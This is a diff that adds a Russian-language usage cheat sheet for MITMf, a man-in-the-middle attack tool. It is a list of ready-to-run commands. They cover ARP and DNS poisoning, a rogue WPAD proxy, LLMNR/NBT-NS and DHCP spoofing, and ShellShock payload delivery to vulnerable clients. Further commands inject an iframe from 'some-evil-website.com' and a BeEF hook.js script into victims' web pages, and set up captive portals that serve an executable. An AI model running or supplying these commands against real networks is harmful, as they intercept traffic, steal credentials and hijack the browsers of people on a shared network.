@@ -1,0 +1,44 @@
+python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1
+То же самое как и выше + жульнический WPAD прокси сервер используя плагин Responder:
+1
+python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --responder --wpad
+ARP poison 192.168.1.16-45 и 192.168.0.1/24 со шлюзом на 192.168.1.1:
+1
+python mitmf.py -i enp3s0 --spoof --arp --target 192.168.2.16-45,192.168.0.1/24 --gateway 192.168.1.1
+Включить DNS спуфинг во время ARP poisoning (Домены для спуфинга беруться из конфигурационного файла):
+1
+python mitmf.py -i enp3s0 --spoof --dns --arp --target 192.168.1.0/24 --gateway 192.168.1.1
+Включить спуфинг LLMNR/NBTNS/MDNS:
+1
+python mitmf.py -i enp3s0 --responder --wredir --nbtns
+Включить сфуфинг DHCP (ip пул и подсеть берутся из конфигурационного файла):
+1
+python mitmf.py -i enp3s0 --spoof --dhcp
+То же что и выше, но в нагрузку с ShellShock, который будет выполнен если какой-либо клиент уязвим:
+1
+python mitmf.py -i enp3s0 --spoof --dhcp --shellshock 'echo 0wn3d'
+Инжект IFrame в HTML, используя плагин Inject:
+1
+python mitmf.py -i enp3s0 --inject --html-url http://some-evil-website.com
+Инжект скрипта JavaSript:
+1
+python mitmf.py -i enp3s0 --inject --js-url http://beef:3000/hook.js
+Запуск перехватывающего портала (captive portal), который перенаправляет всё на http://SERVER/PATH:
+1
+python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive --portalurl http://SERVER/PATH
+Запустить перехватывающий портал на http://your-ip/portal.html используя страницей по умолчанию /portal.html (спасибо responder) и /CaptiveClient.exe (не приложен) из папки config/captive:
+1
+python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive
+Как и выше, но с именем хоста captive.portal вместо IP (требует, чтобы captive.portal преобразовывался в ваш IP, например, через DNS спуфинг):
+1
+python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --dns --captive --use-dns
+Перехватывающий портал с дополнительным экземпляром SimpleHTTPServer, работающим из LOCALDIR на http://IP:8080 (изменить порт в mitmf.config):
+1
+python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --captive --portaldir LOCALDIR
+Как и выше, но с именем хоста:
+1
+python mitmf.py -i enp3s0 --spoof --arp --gateway 192.168.1.1 --dns --captive --portaldir LOCALDIR --use-dns
+И многое-многое другое!
+Конечно вы можете использовать совместно и смешивать почти все плагины (например, ARP spoof + inject + Responder и т.д.)
+
+ 
